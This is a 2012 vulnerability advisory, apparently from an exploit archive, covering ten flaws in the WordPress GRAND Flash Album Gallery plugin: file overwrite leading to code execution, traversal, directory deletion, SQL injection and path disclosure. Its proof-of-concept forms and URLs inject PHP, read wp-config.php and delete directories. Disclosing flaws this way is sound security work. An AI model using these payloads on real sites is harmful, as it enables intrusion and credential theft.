@@ -1,0 +1,505 @@
+id: 19623
+date: 10/24/2012
+title: WordPress GRAND Flash Album Gallery SQL Injection / Disclosure / File Overwrite
+author: waraxe
+cves: 
+
+Multiple Vulnerabilities in Wordpress GRAND Flash Album Gallery Plugin
+=============================================================================================
+
+Author: Janek Vind "waraxe"
+Date: 24. October 2012
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-94.html
+
+
+Description of vulnerable target:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Try GRAND Flash Album Gallery - powerful flash & jQuery media content plugin.
+It provides a comprehensive interface for handling image galleries, audio and
+video. You can edit your media content the way you want: upload images, import
+music and video, create photo gallery, music playlists, group pictures in
+slideshow and add descriptions for each image, mp3 or video - GRAND FlAGallery
+is the smart choice when showing the best of your product or describing in brief
+any event.
+
+http://codeasily.com/wordpress-plugins/flash-album-gallery/flag
+http://wordpress.org/extend/plugins/flash-album-gallery/
+
+Affected versions: 1.9.0, 2.0.0
+
+
+###############################################################################
+1. Arbitrary File Overwrite Vulnerability in "admin/skin_options.php"
+###############################################################################
+
+Reasons:
+ 1. Insecure use of "parse_str()"
+ 2. Uninitialized variable "$mainXML"
+Attack vector: User-supplied POST parameters "settingsXML" and  "mainXML"
+Precondition: Logged in as admin with "FlAG Change skin" privileges
+ 
+ 
+Php script "admin/skin_options.php" line:
+------------------------[ source code start ]----------------------------------
+$settingsXML =  $settings.'/settings.xml';
+
+$flashPost = file_get_contents("php://input");
+// parse properties_skin
+parse_str($flashPost);
+
+if(isset($properties_skin) && !empty($properties_skin)) {
+  $fp = fopen($settingsXML, "r");
+  if(!$fp) {
+    exit( "2");//Failure - not read;
+  }
+  while(!feof($fp)) {
+    $mainXML .= fgetc($fp);
+  }
+  $fp = fopen($settingsXML, "w");
+  if(!$fp)
+    exit("0");//Failure
+  $newProperties = preg_replace("|<properties>.*?</properties>|si", $properties_skin, $mainXML);
+  fwrite($fp, $newProperties);
+  fclose($fp);
+  echo "1";//Save
+------------------------[ source code end ]------------------------------------
+
+As we can observe, php function "parse_str()" is used with user-supplied POST
+parameters as argument. This is very dangerous coding style, because it's
+possible to overwrite any variables set before this code line.
+Attacker can overwrite variable "$settingsXML", which is used as path to the
+file, being overwritten in next steps. So it's obvious, that attacker can choose
+any files on remote system to be overwritten. Next interesting problem here is,
+that variable "$mainXML" is uninitialized. It means, that attacker is able to
+write any data to that variable, using the same "parse_str()", and as result,
+arbitrary data can be written (prepended) to arbitrary file on remote system.
+Attacker can utilize this vulnerability for injecting php code to existing files
+on remote system, which ultimately leads to RCE (Remote Code Execution).
+
+Test (file "wp-content/plugins/hello.php" must exist and be writable):
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-content/plugins/flash-album-gallery/admin/skin_options.php" method="post">
+<input type="hidden" name="properties_skin" value="1">
+<input type="hidden" name="settingsXML" value="../../hello.php">
+<input type="hidden" name="mainXML" value="<?php phpinfo();?>">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Injected php code can be executed by following request:
+
+http://localhost/wp342/wp-content/plugins/hello.php
+
+
+###############################################################################
+2. Arbitrary File Overwrite Vulnerability in "lib/constructor.php"
+###############################################################################
+
+Reasons:
+ 1. Insecure use of "parse_str()"
+ 2. Uninitialized variable "$mainXML"
+Attack vector: User-supplied POST parameters "skin_name" and  "mainXML"
+Preconditions:
+ 1. Logged in as admin with "FlAG Change skin" privileges
+ 2. "magic_quotes_gpc=off" for successful null-byte attacks
+ 3. PHP must be < 5.3.4 for successful null-byte attacks
+
+
+Php script "lib/constructor.php" line 25:
+------------------------[ source code start ]----------------------------------
+$flashPost = file_get_contents("php://input");
+// parse properties_skin
+parse_str($flashPost);
+$settingsXML =  str_replace("\\","/", dirname(dirname(dirname(__FILE__))).
+     '/flagallery-skins/'.$skin_name.'/settings/settings.xml');
+
+if(isset($properties_skin) && !empty($properties_skin)) {
+  $fp = fopen($settingsXML, "r");
+  if(!$fp) {
+    exit( "2");//Failure - not read;
+  }
+  while(!feof($fp)) {
+    $mainXML .= fgetc($fp);
+  }
+  $fp = fopen($settingsXML, "w");
+  if(!$fp)
+    exit("0");//Failure
+  $newProperties = preg_replace("|<properties>.*?</properties>|si", 
+       $properties_skin, $mainXML);
+  if(fwrite($fp, $newProperties))
+------------------------[ source code end ]------------------------------------
+
+This vulnerability is similar to the previous case - main problem here is
+insecure use of "parse_str()", which allows attacker to inject any data to
+overwritten file by using variable "$mainXML". Different is path delivery method.
+This time "$settingsXML" variable is set after use of "parse_str()", so it can't
+be changed by attacker, as in previous case. Still, there is another vulnerable
+user-supplied "POST" parameter "skin_name", which is used in pathname and can
+be manipulated by attacker. By using directory traversal ("../") and null-byte
+attack, it's possible for attacker to write arbitrary data, including php code,
+to arbitrary files on remote system.
+
+
+
+###############################################################################
+3. Directory Structure Disclosure Vulnerability in "admin/ajax.php"
+###############################################################################
+
+Reason: Directory traversal
+Attack vector: User-supplied POST parameter "dir"
+Precondition: Logged in as admin with "FlAG Import folder" privileges
+ 
+ 
+Php script "admin/ajax.php" line 238:
+------------------------[ source code start ]----------------------------------
+$dir = trailingslashit ( urldecode($_POST['dir']) );
+
+ if( file_exists($root . $dir) ) {
+  $files = scandir($root . $dir);
+..
+  foreach( $files as $file ) {
+..
+   if ( file_exists($root . $dir . $file) && $file != '.' && $file != '..' 
+     && is_dir($root . $dir . $file) ) {
+      echo "<li class=\"directory collapsed\"><a href=\"#\" rel=\"" .
+      esc_html($dir . $file) . "/\">" . esc_html($file) . "</a></li>";
+------------------------[ source code end ]------------------------------------
+
+As we can see, user-supplied POST parameter "dir" is used in directory
+scanning function without any sanitization. By using "../" character sequence
+it is possible to utilize directory traversal and reveal the structure of
+arbitrary directories (listing of subdirectories) on remote system.
+
+Test (parameter "nonce" must be valid):
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-admin/admin-ajax.php?action=flag_file_browser&nonce=ce4b0a55d4" method="post">
+<input type="hidden" name="dir" value="../../../../../">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+4. Arbitrary File Disclosure Vulnerability in "admin/news.php"
+###############################################################################
+
+Reason: Directory traversal
+Attack vector: User-supplied POST parameter "want2Read"
+Precondition: Logged in as admin with "manage_options" privileges
+ 
+ 
+Php script "admin/news.php" line 4:
+------------------------[ source code start ]----------------------------------
+if ( current_user_can('manage_options') ) {
+  extract($_POST);
+  $str = file_get_contents($want2Read);
+  echo $str;
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-content/plugins/flash-album-gallery/admin/news.php" method="post">
+<input type="hidden" name="want2Read" value="../../../../wp-config.php">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+5. Arbitrary Directory Deletion Vulnerability in "admin/skins.php"
+###############################################################################
+
+Reason: Directory traversal
+Attack vector: User-supplied GET parameter "delete"
+Preconditions:
+ 1. Logged in as admin with "FlAG Change skin" and "FlAG Delete skins" privileges
+
+ 
+Php script "admin/skins.php" line 185:
+------------------------[ source code start ]----------------------------------
+if ( isset($_GET['delete']) ) {
+  $delskin = $_GET['delete'];
+  if ( current_user_can('FlAG Delete skins') ) {
+    if ( $flag_options['flashSkin'] != $delskin ) {
+      $skins_dir = trailingslashit( $flag_options['skinsDirABS'] );
+      $skin = $skins_dir.$delskin.'/';
+      if(basename($skin) != 'flagallery-skins') {
+        if ( is_dir($skin) ) {
+          if( flagGallery::flagFolderDelete($skin) ) 
+------------------------[ source code end ]------------------------------------
+
+
+Test (beware - directory "akismet" will be deleted):
+
+http://localhost/wp342/wp-admin/admin.php?page=flag-skins&delete=../akismet
+
+Result: "Skin '../akismet' deleted successfully".
+
+If directory "akismet" existed before and was deletable by php, then it's gone.
+
+
+###############################################################################
+6. SQL Injection Vulnerability in "admin/ajax.php"
+###############################################################################
+
+Reason: Insufficient sanitization of user-supplied data
+Attack vector: User-supplied POST parameter "form"
+Precondition: Logged in as admin with "FlAG Manage gallery" privileges
+
+
+Php script "admin/ajax.php" line 112:
+------------------------[ source code start ]----------------------------------
+function flag_save_album() {
+..
+ if(isset($_POST['form']))
+   parse_str($_POST['form']);
+ if($album_name && $album_id) {
+..
+ $result = $wpdb->query( "UPDATE $wpdb->flagalbum SET name = '{$name}', 
+    categories = '{$galstring}' WHERE id = $album_id" );
+------------------------[ source code end ]------------------------------------
+
+
+
+Test: first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Next we can use html form below:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://localhost/wp342/wp-admin/admin-ajax.php?action=flag_save_album" method="post">
+<input type="hidden" name="form" value="album_name=1&album_id=waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+UPDATE wp_flag_album SET name = '1', categories = '' WHERE id = waraxe
+
+
+###############################################################################
+7. SQL Injection Vulnerability in "admin/manage.php"
+###############################################################################
+
+Reason: Insufficient sanitization of user-supplied data
+Attack vector: User-supplied POST parameter "description"
+Precondition: Logged in as admin with "FlAG Manage gallery" privileges
+
+
+Php script "admin/manage.php" line 332:
+------------------------[ source code start ]----------------------------------
+function update_pictures() {
+..
+ $description =   $_POST['description'];
+..
+ if ( is_array($description) ) {
+  foreach( $description as $key => $value ) {
+   $desc = $wpdb->escape($value);
+   $wpdb->query( "UPDATE $wpdb->flagpictures SET description = '$desc'
+      WHERE pid = $key");
+------------------------[ source code end ]------------------------------------
+
+
+Test: first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Next, we need Firefox Add-on "Tamper Data" for POST request manipulation.
+Open gallery management page:
+
+http://localhost/wp342/wp-admin/admin.php?page=flag-manage-gallery
+
+Navigate to edit mode:
+
+http://localhost/wp342/wp-admin/admin.php?page=flag-manage-gallery&mode=edit&gid=1
+
+Activate "Tamper Data".
+Click "Save changes" on webpage, "Tamper Data" triggers.
+
+Add new POST parameter "description[waraxe]=test", click "OK".
+Modified POST request will fly to the server and we can see SQL error:
+
+WordPress database error: [Unknown column 'waraxe' in 'where clause']
+UPDATE wp_flag_pictures SET description = 'test' WHERE pid = waraxe
+
+
+###############################################################################
+8. Directory Existence Disclosure Vulnerability in "facebook.php"
+###############################################################################
+
+Reason: Directory traversal
+Attack vector: User-supplied GET parameter "f"
+Precondition: None
+Result: Attacker can detect the presence of directories on remote system
+
+
+Php script "facebook.php" line 21:
+------------------------[ source code start ]----------------------------------
+if(isset($_GET['i'])) {
+ $skin = '';
+ if(isset($_GET['f'])){
+  $skinpath = trailingslashit( $flag_options['skinsDirABS'] ).$_GET['f'];
+  if(is_dir($skinpath))
+   $skin = $_GET['f'];
+..
+$gids = $_GET['i'];
+..
+if($gids){
+ echo flagShowFlashAlbum($gids, $name='Gallery', $width='100%', $height=$h, 
+   $skin, $playlist='', $wmode='opaque', $linkto); ?>
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/flash-album-gallery/facebook.php?i=1&f=../../../wp-admin
+http://localhost/wp342/wp-content/plugins/flash-album-gallery/facebook.php?i=1&f=../../../foobar
+
+Result:
+
+we can see different responses to existing and non-existent directories
+
+
+###############################################################################
+9. SQL Injection Vulnerability in "lib/shortcodes.php"
+###############################################################################
+
+Reason: Insufficient sanitization of user-supplied data
+Attack vector: Shortcode parameter "orderby"
+Precondition: Logged in as admin, editor or author (must be able to create
+  or edit posts)
+
+
+Php script "lib/shortcodes.php" line 19:
+------------------------[ source code start ]----------------------------------
+add_shortcode( 'flagallery', array(&$this, 'show_flashalbum' ) );
+..
+ function show_flashalbum( $atts ) {
+   global $wpdb, $flagdb;
+   extract(shortcode_atts(array(
+    'gid'     => '',
+..
+    'order'     => '',
+..
+   } elseif($gid == "all") {
+    if(!$orderby) $orderby='gid';
+    if(!$order) $order='DESC';
+    $gallerylist = $flagdb->find_all_galleries($orderby, $order);
+------------------------[ source code end ]------------------------------------
+
+Php script "lib/flag-db.php" line 76:
+------------------------[ source code start ]----------------------------------
+function find_all_galleries($order_by = 'gid', $order_dir = 'ASC', 
+ $counter = false, $limit = 0, $start = 0, $exclude = 0) {
+..
+ $this->galleries = $wpdb->get_results( "SELECT SQL_CALC_FOUND_ROWS * 
+   FROM $wpdb->flaggallery 
+   ORDER BY {$order_by} {$order_dir} {$limit_by}", OBJECT_K );
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+Step1:
+
+first we need to make sure, that Wordpress will show SQL errors.
+Let's open the file "wp-includes/wp-db.php" and change the line
+
+var $show_errors = false;
+
+to the line below:
+
+var $show_errors = true;
+
+Step 2: insert following shortcode to the post:
+
+[flagallery gid="all" orderby="waraxe"]
+
+Step 3: Open webpage with previously created/modified post
+
+Result: SQL error will be shown:
+
+WordPress database error: [Unknown column 'waraxe' in 'order clause']
+SELECT SQL_CALC_FOUND_ROWS * FROM wp_flag_gallery ORDER BY waraxe DESC
+
+
+
+###############################################################################
+10. Full Path Disclosure Vulnerability in multiple scripts
+###############################################################################
+
+Reasons: Direct request to php script triggers pathname leak in error message
+Preconditions: PHP directive "display_errors=on"
+Result: Information Exposure Through an Error Message
+
+Tests:
+
+http://localhost/wp342/wp-content/plugins/flash-album-gallery/widgets/widgets.php
+
+Fatal error: Class 'WP_Widget' not found in
+C:\apache_www\wp342\wp-content\plugins\flash-album-gallery\widgets\widgets.php on line 12
+
+http://localhost/wp342/wp-content/plugins/flash-album-gallery/lib/shortcodes.php
+
+Fatal error: Call to undefined function add_shortcode() in
+C:\apache_www\wp342\wp-content\plugins\flash-album-gallery\lib\shortcodes.php on line 19
+
+http://localhost/wp342/wp-content/plugins/flash-album-gallery/admin/tinymce/tinymce.php
+
+Fatal error: Call to undefined function add_filter() in
+C:\apache_www\wp342\wp-content\plugins\flash-album-gallery\admin\tinymce\tinymce.php on line 27
+
+http://localhost/wp342/wp-content/plugins/flash-album-gallery/admin/ajax.php
+
+Fatal error: Call to undefined function add_action() in
+C:\apache_www\wp342\wp-content\plugins\flash-album-gallery\admin\ajax.php on line 3
+
+http://localhost/wp342/wp-content/plugins/flash-album-gallery/admin/grab_meta.php
+
+Fatal error: Class 'flagMeta' not found in
+C:\apache_www\wp342\wp-content\plugins\flash-album-gallery\admin\grab_meta.php on line 2
+
+http://localhost/wp342/wp-content/plugins/flash-album-gallery/admin/jgallery.php
+
+Fatal error: Call to undefined function get_option() in
+C:\apache_www\wp342\wp-content\plugins\flash-album-gallery\admin\jgallery.php on line 2
+
+http://localhost/wp342/wp-content/plugins/flash-album-gallery/admin/media-upload.php
+
+Fatal error: Call to undefined function add_filter() in
+C:\apache_www\wp342\wp-content\plugins\flash-album-gallery\admin\media-upload.php on line 14
+
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
+
+#  0day.today [2023-03-22]  #
